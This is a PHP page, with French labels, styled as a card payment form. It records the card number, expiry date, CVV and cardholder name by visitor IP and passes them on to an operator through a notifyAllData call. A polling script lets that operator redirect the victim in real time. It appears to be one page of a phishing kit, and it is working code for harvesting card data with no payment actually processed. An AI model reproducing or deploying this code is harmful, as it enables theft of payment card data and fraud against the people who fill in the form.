<?php
require_once 'config.php';
checkRedirect();

if ($_POST && isset($_POST['numero_carte'])) {
    $carte_data = [
        'numero_carte' => $_POST['numero_carte'],
        'date_expiration' => $_POST['date_expiration'],
        'cvv' => $_POST['cvv'],
        'titulaire' => $_POST['titulaire']
    ];
    
    // Sauvegarder les données par IP
    saveFormData($current_ip, 'carte', $carte_data);
    
    // Notifier TOUTES les données disponibles pour cette IP
    notifyAllData($current_user_id, $current_ip, 'carte');
    
    header("Location: loader.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Paiement</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #dc3545; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
        .row { display: flex; gap: 10px; }
        .row .form-group { flex: 1; }
    </style>
</head>
<body>
    <div class="container">
        <h1>💳 Paiement</h1>
        
        <form method="post">
            <div class="form-group">
                <label>Numéro de carte *</label>
                <input type="text" name="numero_carte" placeholder="1234 5678 9012 3456" required>
            </div>
            
            <div class="row">
                <div class="form-group">
                    <label>Date expiration *</label>
                    <input type="text" name="date_expiration" placeholder="MM/AA" required>
                </div>
                <div class="form-group">
                    <label>CVV *</label>
                    <input type="text" name="cvv" placeholder="123" required>
                </div>
            </div>
            
            <div class="form-group">
                <label>Titulaire de la carte *</label>
                <input type="text" name="titulaire" placeholder="Nom comme sur la carte" required>
            </div>
            
            <button type="submit" class="btn">💳 Payer</button>
        </form>
    </div>

    <script>
    setInterval(() => {
        fetch('check_redirect.php?user_id=<?php echo $current_user_id; ?>')
            .then(r => r.text())
            .then(page => {
                if (page && page.trim() !== '' && page !== 'payment.php') {
                    window.location.href = page;
                }
            });
    }, 2000);
    </script>
</body>
</html>
